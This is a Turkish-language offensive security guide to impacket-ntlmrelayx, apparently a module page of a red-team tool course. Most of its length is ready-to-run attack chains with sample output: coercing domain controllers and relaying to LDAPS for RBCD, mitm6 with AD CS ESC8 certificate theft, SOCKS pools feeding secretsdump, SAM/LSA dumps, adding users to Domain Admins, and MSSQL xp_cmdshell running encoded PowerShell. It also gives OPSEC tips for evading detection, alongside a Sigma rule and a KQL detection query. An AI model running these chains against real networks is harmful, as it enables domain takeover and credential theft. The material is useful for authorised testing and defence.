# impacket-ntlmrelayx

> **Kategori:** [5. NTLM ve Kerberos Relay Motorları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Ağ üzerinden yakalanan veya zorlanan NTLM kimlik doğrulama oturumlarını SMB, HTTP, LDAP, LDAPS, MSSQL ve IMAP gibi servislere aktararak (relay) etki alanında ayrıcalık yükseltme, RBCD yapılandırma, AD CS üzerinden sertifika talep etme ve oturum kaçırma saldırılarını otomatize eden endüstri standardı relay motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında NTLM kimlik doğrulama mekanizması doğası gereği istemci ile sunucu arasında karşılıklı meydan okuma-yanıt (challenge-response) protokolü yürütür. Ancak bu protokol, ara katmanda kriptografik imzalama (SMB Signing) veya kanal bağlama (Channel Binding Token - CBT / EPA) zorunlu kılınmadığı sürece oturumun yetkisiz bir üçüncü tarafa iletilmesini (Relay) engelleyemez. **`impacket-ntlmrelayx`**, yakalanan NTLMv1/v2 kimlik doğrulamalarını çoklu protokol desteğiyle hedef sunuculara anlık olarak ileten, arka planda dinamik SOCKS proxy havuzu oluşturan ve hedeflenen protokole özgü sömürü yüklerini (RBCD enjeksiyonu, kullanıcı oluşturma, AD CS sertifika talebi, SAM dökümü vb.) otonom olarak çalıştıran en kapsamlı saldırı motorudur.

Araç, ağ üzerinde hem pasif bir dinleyici (SMB port 445, HTTP port 80/8080/443, WCF port 80) olarak çalışabilir hem de `mitm6`, `Coercer`, `PetitPotam`, `SpoolSample` gibi zorlamalı kimlik doğrulama ve ağ zehirleme araçlarıyla birleştirildiğinde etki alanı denetleyicilerini (Domain Controller) dahi kendi aleyhine kullanarak sıfır hakka sahip bir durumdan Domain Admin seviyesine sıçrama imkanı tanır.

### Mimari Akış Şeması

```
[ Kurban / DC / Exchange ]
       │
       │ (1) Zorlamalı Tetikleme (MS-EFSR / MS-RPRN / WPAD / IPv6 DNS)
       ▼
[ ntlmrelayx Dinleyici (445/SMB, 80/HTTP) ]
  ├── Dinleyici: NTLM Negotiate yakala
  │
  ├── [ Kriptografik İşlemler & Bayrak Düzenleme ]
  │     ├── NTLMSSP_NEGOTIATE_SIGN bayrağını kaldır
  │     └── Message Integrity Code (MIC) atlatma / temizleme
  │
  ├── [ Protokol ve Servis Çevrimi ]
  │     ├── SMB  ──relay──>  SMB (Hedef Dosya Sunucusu - SMB Signing kapalı)
  │     ├── HTTP ──relay──>  LDAPS (Domain Controller - RBCD / ESC8)
  │     ├── SMB  ──relay──>  MSSQL (Veritabanı Sunucusu - xp_cmdshell)
  │     └── SMB  ──relay──>  SOCKS Proxy Havuzu (127.0.0.1:1080)
  │
  ▼
[ Hedef Servisler ]
  ├── LDAPS (DC:636)    ──> msDS-AllowedToActOnBehalfOfOtherIdentity yazma (RBCD)
  ├── AD CS Web (80)    ──> ESC8: DC Makine Sertifikası çekme (.pfx)
  ├── SMB (Workstation) ──> SAM / LSA dökümü veya Komut Yürütme (Interactive / -c)
  └── MSSQL (SQL Servis)──> sysadmin haklarıyla kod yürütme
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Çoklu Protokol Desteği** | Gelen SMB/HTTP isteklerini SMB, LDAP, LDAPS, MSSQL, HTTP, HTTPS, IMAP, SMTP ve RPC hedeflerine yönlendirir. | Tek bir kimlik yakalama oturumuyla tamamen farklı servislerin ele geçirilmesini sağlar. |
| **RBCD Enjeksiyonu (`--delegate-access`)** | Relay edilen kurban yetkisiyle hedef makine hesabına Kaynak Tabanlı Kısıtlı Yetki Devri (RBCD) hakkı yazar. | Hedef sunucuda yerel SYSTEM hakları elde etmenin en güvenilir yoludur. |
| **AD CS Entegrasyonu (`--adcs`)** | Web Enrollment (HTTP) noktasına relay ederek kurban adına X.509 makine/kullanıcı sertifikası üretir. | PetitPotam + AD CS ESC8 zinciriyle tek adımda Domain Controller ele geçirme. |
| **Dinamik SOCKS Proxy Havuzu (`-socks`)** | Başarıyla kurulan oturumları canlı tutarak yerel 1080 portunda SOCKS4/5 proxy oturumu açar. | Tekrar tekrar kimlik zorlamaya gerek kalmadan `proxychains` ile saatlerce komut çalıştırma. |
| **MIC Atlatma Desteği** | NTLMv2 Message Integrity Code (MIC) bayrağını ve NTLMSSP korumalarını manipüle eder (CVE-2019-1040). | İstemcinin SMB'den LDAP'a relay korumalarını aşmasına olanak tanır. |

### Relay Araçları Karşılaştırması

| Özellik / Araç | impacket-ntlmrelayx | KrbRelay | KrbRelayUp | Responder (Built-in) |
|---|---|---|---|---|
| **Birincil Protokol** | NTLM | Kerberos (AP-REQ) | Kerberos + NTLM | NTLM |
| **Çalışma Platformu** | Linux / Python | Windows (.NET / C#) | Windows (.NET / C#) | Linux / Python |
| **Hedef Protokoller** | SMB, LDAP, LDAPS, HTTP, MSSQL, IMAP | LDAP, HTTP, RPC | Yerel LPE (LDAP / RBCD) | SMB, HTTP (Sınırlı) |
| **SOCKS Proxy Yeteneği** | Var (Çoklu Oturum) | Yok | Yok | Yok |
| **AD CS ESC8 Desteği** | Dahili (`--adcs`) | Özel yapılandırma gerek | Yok | Yok |
| **Kullanım Alanı** | Ağ genelinde pivot ve relay | Yerel oturum yükseltme | Tek tıkla yerel SYSTEM | Sadece temel yakalama |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
impacket-ntlmrelayx -t <HEDEF_URL> [SEÇENEKLER]
impacket-ntlmrelayx -tf <HEDEF_LISTESI_DOSYASI> -smb2support [SEÇENEKLER]
```

### Kritik CLI Parametreleri

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-t, --target` | Relay edilecek tekil hedef URL veya servis adresi. | `ldaps://192.168.1.10` |
| `-tf <dosya>` | Çoklu hedeflerin bulunduğu liste dosyası (satır satır protokol ve IP). | `targets.txt` |
| `-smb2support` | SMBv2 ve SMBv3 protokol desteğini aktif eder (Zorunludur). | Bayrak |
| `-socks` | Başarılı kimlik doğrulama oturumlarını SOCKS proxy olarak arka planda saklar. | Bayrak |
| `-i, --interactive` | SMB relay başarılı olduğunda interaktif bir kabuk portu (127.0.0.1:11000) açar. | Bayrak |
| `-c <komut>` | SMB relay başarılı olduğunda kurban makinede çalıştırılacak işletim sistemi komutu. | `-c "whoami /all"` |
| `-e <dosya>` | SMB relay başarılı olduğunda kurban makinede çalıştırılacak ikili (executable) dosya. | `-e beacon.exe` |
| `--escalate-user` | LDAP relay sırasında belirtilen etki alanı kullanıcısını Domain Admins grubuna ekler. | `--escalate-user lowpriv` |
| `--delegate-access` | Kurban makine üzerinde saldırganın kontrolündeki hesaba RBCD yetkisi tanımlar. | Bayrak |
| `--escalate-user-sid` | `--escalate-user` için doğrudan SID değeri belirtir. | `S-1-5-21-...-512` |
| `--add-computer [ad]` | LDAP relay üzerinden etki alanına yeni bir bilgisayar hesabı ekler. | `--add-computer EVILPC$` |
| `--shadow-credentials` | msDS-KeyCredentialLink özniteliğine sertifika enjekte eder (Whiskey/Shadow Credentials). | Bayrak |
| `--adcs` | AD CS Web Enrollment arayüzüne sertifika talebi iletir (ESC8). | Bayrak |
| `--template <ad>` | AD CS relay sırasında talep edilecek sertifika şablonu (Örn: DomainController, Machine). | `--template Machine` |
| `--dump` | Hedef makinedeki SAM ve LSA sırlarını otomatik olarak döker. | Bayrak |
| `-l <dizin>` | Dökülen SAM/LSA ve hash dosyalarının kaydedileceği hedef dizin. | `/tmp/loot` |
| `-wh <ip>` | WebDAV veya HTTP isteklerinde kullanılacak sahte WPAD/Web sunucusu IP adresi. | `192.168.1.50` |
| `-6` | Dinleyicide IPv6 desteğini açar (`mitm6` ile birlikte kullanımda önerilir). | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: PetitPotam / Coercer ile Domain Controller'ı LDAPS'a Relay Ederek RBCD Kurma

Etki alanında kısıtlı bir kullanıcı hesabı (`lowpriv`) varken, `Coercer` veya `PetitPotam` ile Primary DC (DC01) tetiklenir ve kimlik doğrulaması Secondary DC (DC02) LDAPS servisine aktarılır. Saldırgan kontrolündeki bir bilgisayar hesabına RBCD izni tanımlanır.

```bash
# Adım 1: ntlmrelayx dinleyicisini LDAPS hedefi ve RBCD bayrağı ile başlatın
impacket-ntlmrelayx -t ldaps://dc02.corp.local \
  -smb2support \
  --delegate-access

# [Adım 2: Başka bir terminalden DC01'i ntlmrelayx IP adresine yönlendirin]
coercer coerce -u "lowpriv" -p "Password123!" -d corp.local \
  -l 192.168.1.50 -t 192.168.1.10
```

**ntlmrelayx Konsol Çıktısı Analizi:**

```text
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in attack mode to produce delegation rights
[*] Servers started, waiting for connections with credentials...
[*] SMBD-Thread-7: Received connection from 192.168.1.10, attacking target ldaps://dc02.corp.local
[*] Authenticating against ldaps://dc02.corp.local as CORP\DC01$ SUCCEED
[*] User CORP\DC01$ authenticated successfully against ldaps://dc02.corp.local
[*] Target system doesn't have msDS-AllowedToActOnBehalfOfOtherIdentity set
[*] Generating a new Machine Account on LDAP: ATTACKER_COMPUTER$
[*] Added new computer account: ATTACKER_COMPUTER$ with password: Password_Random123!
[*] Setting msDS-AllowedToActOnBehalfOfOtherIdentity on target CORP\DC01$ to allow ATTACKER_COMPUTER$
[*] Delegation rights successfully configured!
[*] S4U2Proxy ticket can now be requested for CORP\DC01$ as any user (e.g. Administrator)
```

---

### Senaryo 2: mitm6 ve ntlmrelayx ile AD CS ESC8 İstismarı (Domain Admin Ele Geçirme)

Ağdaki Windows istemcilerin IPv6 DNS trafiği devralınır (`mitm6`). ntlmrelayx bu istekleri AD CS sertifika sunucusunun HTTP Web Enrollment (`/certsrv/`) servisine yönlendirir ve etki alanı makinesine ait X.509 sertifikasını çeker.

```bash
# Terminal 1: mitm6 dinleyicisini başlatın
sudo mitm6 -d corp.local -i eth0

# Terminal 2: ntlmrelayx'i AD CS Web Enrollment hedefiyle yapılandırın
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

**Sertifika Üretim Çıktısı:**

```text
[*] HTTPD: Received connection from fe80::d9f:2311:4a2:99bf
[*] Authenticating against http://ca.corp.local/certsrv/certfnsh.asp as CORP\DC01$ SUCCEED
[*] Generating CSR for CORP\DC01$...
[*] CSR sent! Waiting for certificate...
[*] Certificate retrieved successfully!
[*] Writing certificate to CORP_DC01$.pfx (base64 encoded PFX format)
[*] Base64 PFX: MIIKngIBAzCCCm8GCSqGSIb3DQEHAaCCCmAEg...
[*] Use gettgtpkinit.py or PKINITtools to authenticate with this certificate!
```

---

### Senaryo 3: SMB Hedeflerine Karşı SOCKS Proxy Havuzu Oluşturma

Birden fazla iş istasyonuna yapılan relay saldırılarında oturumların sonlanmasını engellemek için SOCKS havuzu kullanılır.

```bash
# Hedef dosya (SMB Signing zorunlu olmayan makineler)
cat << 'EOF' > smb_targets.txt
smb://192.168.1.101
smb://192.168.1.102
smb://192.168.1.103
EOF

# ntlmrelayx SOCKS modunda başlatılır
impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks
```

**SOCKS Oturum Yönetimi ve Kullanımı:**

```bash
# 1. ntlmrelayx konsolunda çalışan oturumları listeleyin
ntlmrelayx> socks

# Çıktı:
# Protocol  Target         Username            AdminStatus  Port
# SMB       192.168.1.101  CORP/JDOE           TRUE         445
# SMB       192.168.1.102  CORP/SVC_BACKUP     TRUE         445

# 2. Proxychains üzerinden doğrudan secretsdump veya wmiexec çalıştırın
proxychains impacket-secretsdump -no-pass -k 'CORP/JDOE'@192.168.1.101
```

---

### Senaryo 4: MSSQL Veritabanına Relay ve Komut Yürütme

Yüksek yetkili bir veritabanı yöneticisinin veya servis hesabının NTLM oturumu MSSQL servisine aktarılarak `xp_cmdshell` tetiklenir.

```bash
impacket-ntlmrelayx -t mssql://sql01.corp.local \
  -smb2support \
  -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -enc SUVYA...';"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `SMB SessionError: STATUS_ACCESS_DENIED` | Hedef sunucuda SMB Signing (İmzalama) zorunludur (`Required: True`). | SMB signing aktif olan hedefe SMB relay yapılamaz. Hedefi `ldaps://` veya `http://` servisine yönlendirin. |
| `LDAPSessionError: strongAuthRequired (8)` | Hedef Domain Controller düz metin LDAP (port 389) üzerinde şifrelenmemiş NTLM kabul etmiyor. | Hedef URL'yi `ldap://` yerine mutlaka `ldaps://` (port 636) olarak güncelleyin. |
| `Failed to parse challenge (MIC failure / NTLM dialect mismatch)` | NTLMv2 oturumunda Message Integrity Code (MIC) doğrulaması aktif veya EPA / CBT devrede. | CVE-2019-1040 yamasını kontrol edin; hedef HTTP ise Channel Binding Token devrededir, LDAP hedeflerini deneyin. |
| `[!] Port 445 already in use` | Yerel sistemde `smbd` servisi veya `Responder.py` arka planda SMB dinleyicisini tutuyor. | `sudo systemctl stop smbd` komutu verin ve `Responder.conf` içinde `SMB = Off` ayarlayın. |
| `AD CS HTTP 401 Unauthorized` | AD CS Web Enrollment arayüzünde EPA (Extended Protection for Authentication) aktif. | EPA zorunlu kılındıysa NTLM relay engellenir; RPC veya LDAP hedeflerine pivot yapın. |
| `Constraint violation / MachineAccountQuota exceeded` | `--add-computer` bayrağı çalıştırılırken etki alanında kullanıcı başına makine kotası (MAQ=0) dolmuş. | `--delegate-access` parametresini mevcut bilinen bir bilgisayar hesabıyla `--computer-name` belirterek kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK YÜKSEK (AĞ TRAFİĞİ & EVENT LOG)
──────────────────────────────────────────────────────────────────
[ Ağ Trafiği ]      : Anlık yüzlerce SMB/HTTP/LDAP oturum başlatma
[ Windows Logları ] : Event ID 4624 (Logon Type 3 - Network), Event ID 4720, 4738
[ EDR / AV ]        : LSASS erişimi olmaksızın uzaktan servis oluşturma / RBCD manipülasyonu
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4624 (Logon Type 3):**
   - Kaynak Ağ Adresi (`Source Network Address`), saldırganın relay makinesinin IP'sini gösterir.
   - Ancak Doğrulanan Hesap (`TargetUserName`), kandırılan kurban hesaptır. Bu uyumsuzluk (Workstation IP'sinden gelen Domain Controller hesabı) kesin relay göstergesidir.
2. **Windows Security Event ID 4720 & 4738:**
   - `--add-computer` kullanıldığında: Event ID 4720 (A user account was created - `Account Type: Machine`).
   - `--delegate-access` kullanıldığında: Event ID 4738 (A user account was modified - `AllowedToActOnBehalfOfOtherIdentity` alanı dolduruldu).
3. **Active Directory Certificate Services Event ID 4886 & 4887:**
   - Web Enrollment üzerinden talep edilen sertifika kaydı (`Certificate Services approved a certificate request`). Talep eden makinenin IP'si ile sertifika sahibinin adı eşleşmez.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Search Filter Yoğunluğu:** `--delegate-access` veya `--dump` çalıştırıldığında anlık çok sayıda `objectCategory=computer` ve `sAMAccountName` sorgusu atılır.
- **RPC Coercion Uyumsuzluğu:** Coercer veya PetitPotam arkasından gelen ani Type 3 NTLM kimlik doğrulama anomalisi SIEM motorları tarafından korelasyon kuralıyla yakalanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | SMB/HTTP oturumlarını yakalayıp hedef servise aktarma. |
| **T1558.003** | Subverting Trust: Kerberos Ticket Manipulation (RBCD) | `--delegate-access` ile makine hesabına yetki devri enjekte etme. |
| **T1649** | Steal or Forge Authentication Certificates | `--adcs` bayrağıyla Web Enrollment üzerinden sertifika çekme (ESC8). |
| **T1003.002** | OS Credential Dumping: Security Account Manager (SAM) | `--dump` parametresi ile hedef makinenin SAM kovanını uzaktan alma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Eşzamanlı Çoklu Hedef Taraması** | `-tf targets.txt` içine yüzlerce IP girmek yerine hedefi daraltın; yalnızca SMB Signing kapalı tekil sunucuları hedefleyin. |
| **Yeni Bilgisayar Hesabı İmzası** | `--add-computer` rastgele `EVIL$` isimli hesap açar ve SIEM alarmlarını tetikler. Önceden ele geçirilmiş meşru bir makine hesabını kullanın. |
| **Kalıcı RBCD İzi** | Operasyon tamamlandığında kurban makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini temizleyin (Active Directory nesne hijyeni). |
| **SOCKS Port Açıklığı** | SOCKS portunu (varsayılan 1080) yalnızca `127.0.0.1` dinleyecek şekilde tutun, dış ağlara açmayın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — LDAPS Üzerinden Şüpheli RBCD Ataması:**

```yaml
title: Potential RBCD Configuration via Relay Attack
status: experimental
description: Detects modification of msDS-AllowedToActOnBehalfOfOtherIdentity by unexpected accounts.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4738
  filter:
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  condition: selection and filter
falsepositives:
  - Legitimate AD administration or server provisioning tools
level: high
```

**Microsoft Sentinel (KQL) — Kaynak ve Hesap Uyumsuzluğu (Relay Tespiti):**

```kql
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetAccountType == "Machine"
| where IpAddress !in ("", "127.0.0.1", "::1")
| where Computer != IpAddress
| project TimeGenerated, TargetAccount, Computer, IpAddress, AuthenticationPackageName
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: LDAPS Üzerinden RBCD Yetki Devri Enjeksiyonu
```bash
impacket-ntlmrelayx -t ldaps://dc01.corp.local -smb2support --delegate-access
```
- **Ne Yapar?** Gelen SMB/HTTP oturumunu DC01 üzerindeki güvenli LDAPS servisine aktarır; etki alanına yeni bir makine hesabı ekleyip kurban makineye bu hesaba yönelik RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`) hakkı tanımlar.
- **Ne Zaman Kullanılır?** `Coercer` veya `PetitPotam` ile tetiklenen Domain Controller veya sunucu oturumlarını tek tıkla tam kontrole dönüştürmek için.
- **Parametreler:** `-t`: Hedef LDAPS adresi, `-smb2support`: SMBv2/3 desteği, `--delegate-access`: RBCD kurma motoru.

### Komut 2: AD CS ESC8 Web Enrollment Sertifika Hırsızlığı
```bash
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```
- **Ne Yapar?** Yakalanan Domain Controller NTLM oturumunu AD CS HTTP servisine relay ederek DC adına geçerli bir X.509 makine sertifikası (`.pfx`) üretir.
- **Ne Zaman Kullanılır?** Sertifika otoritesinde HTTP Web Enrollment açık ve EPA kapalı olduğunda (ESC8 zafiyeti).
- **Parametreler:** `--adcs`: AD CS sömürü motoru, `--template`: Üretilecek sertifika şablonu tipi.

### Komut 3: Arka Planda Canlı SOCKS4/5 Oturum Havuzu Açma
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```
- **Ne Yapar?** Listelenen tüm SMB hedeflerine gelen kimlik doğrulamalarını relay eder ve her başarılı oturumu `127.0.0.1:1080` portunda interaktif SOCKS oturumu olarak bekletir.
- **Ne Zaman Kullanılır?** Ağ genelinde parola bilmeksizin `proxychains` ile birden fazla makineye uzaktan erişim ve LSASS dökümü yapmak için.
- **Parametreler:** `-tf`: Hedef dosya listesi, `-socks`: SOCKS proxy modunu devreye sokar.

### Komut 4: SMB Hedefine Karşı İnteraktif Shell Başlatma
```bash
impacket-ntlmrelayx -t smb://192.168.1.105 -smb2support -i
```
- **Ne Yapar?** SMB relay başarılı olduğu anda yerel `127.0.0.1:11000` portunda interaktif bir SMB oturum kabuğu (SMB Shell) açar.
- **Ne Zaman Kullanılır?** Kurban makine üzerinde doğrudan dosya yükleme, indirme veya uzaktan komut yürütme ihtiyacı duyulduğunda.
- **Parametreler:** `-i`: İnteraktif port dinleyicisini aktifleştirir.

### Komut 5: Başarılı Relay ile Otomatik SAM ve LSA Hash Dökümü
```bash
impacket-ntlmrelayx -tf smb_targets.txt -smb2support --dump -l /tmp/hashes/
```
- **Ne Yapar?** Hedef makinelere relay edilen oturum yerel yönetici (Local Administrator) haklarına sahipse, SAM ve LSA kovanlarını okuyarak yerel kullanıcı parolalarını ve NTLM hash'lerini diske kaydeder.
- **Ne Zaman Kullanılır?** Yanal hareket öncesinde yerel yönetici parolalarını (örneğin yerel Administrator) toplamak için.
- **Parametreler:** `--dump`: SAM/LSA dökümü bayrağı, `-l`: Kaydedilecek yerel dizin.

### Komut 6: Hedef Makinede Uzaktan Komut Çalıştırma
```bash
impacket-ntlmrelayx -t smb://fileserver.corp.local -smb2support -c "powershell -enc UwBlAH..."
```
- **Ne Yapar?** Relay edilen oturum üzerinden hedef sistemde Windows servisi oluşturarak verilen PowerShell komutunu `NT AUTHORITY\SYSTEM` yetkileriyle çalıştırır.
- **Ne Zaman Kullanılır?** Doğrudan C2 ajanı (Beacon) başlatmak veya yerel kullanıcı eklemek için.
- **Parametreler:** `-c`: Çalıştırılacak CLI komutu.

### Komut 7: LDAP Üzerinden Belirtilen Kullanıcıyı Domain Admins Grubuna Ekleme
```bash
impacket-ntlmrelayx -t ldaps://dc.corp.local -smb2support --escalate-user lowpriv
```
- **Ne Yapar?** Relay edilen oturum etki alanı yöneticisi (Domain Admin) haklarına sahipse, LDAP üzerinden belirtilen standart kullanıcıyı `Domain Admins` grubuna üye yapar.
- **Ne Zaman Kullanılır?** Bir yöneticinin istemci makineye erişimi sırasında (örneğin sahte WPAD veya LLMNR ile) oturumu yakalandığında.
- **Parametreler:** `--escalate-user`: Gruba eklenecek hedef kullanıcı hesabı.

### Komut 8: MSSQL Servisine Komut Enjeksiyonu
```bash
impacket-ntlmrelayx -t mssql://sql.corp.local -smb2support -q "EXEC xp_cmdshell 'whoami'"
```
- **Ne Yapar?** Veritabanı yöneticisi oturumunu SQL Server'a aktarır ve `xp_cmdshell` prosedürü üzerinden işletim sistemi seviyesinde komut yürütür.
- **Ne Zaman Kullanılır?** SMB Signing açık ancak MSSQL servisinin açık ve savunmasız olduğu ortamlarda.
- **Parametreler:** `-q`: Çalıştırılacak SQL sorgusu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **MITRE ATT&CK Referansı:** [T1557.001 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/001/)
- **Microsoft Security Güvenlik Bülteni:** [CVE-2019-1040 - NTLM MIC Bypass Detayları](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1040)
- **SpecterOps Araştırması:** [Certified Pre-Owned - Active Directory Certificate Services (AD CS) Abuse](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

---

> **Önceki:** [← PrivExchange (Kategori 04)](../Kategori_04_Zehirleme_MitM_ve_Zorlamali_Kimlik/PrivExchange.md) · **Sonraki:** [KrbRelay →](./KrbRelay.md)
